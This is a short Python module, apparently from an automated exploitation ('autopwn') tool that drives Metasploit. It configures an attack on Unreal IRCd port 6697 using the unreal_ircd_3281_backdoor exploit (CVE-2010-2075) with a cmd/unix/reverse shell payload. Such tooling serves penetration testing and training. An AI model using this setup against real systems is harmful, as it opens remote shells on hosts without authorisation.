#!/usr/bin/env python3

from .base import Service

import logging

log = logging.getLogger(__name__)


class Unreal(Service):
    def __init__(self, autopwn):

        super(Unreal, self).__init__()
        self._autopwn = autopwn
        self._msfrpcd = self._autopwn._msfrpcd

        self.name = "Unreal IRCd"
        self.protocols = "TCP"
        self.ports = [6697]
        self.exploits = [
            "exploit/unix/irc/unreal_ircd_3281_backdoor"
        ]
        self.payload = "cmd/unix/reverse"
        self.creds = []
        self.cves = ["CVE-2010-2075"]
        self.msfopts = {}
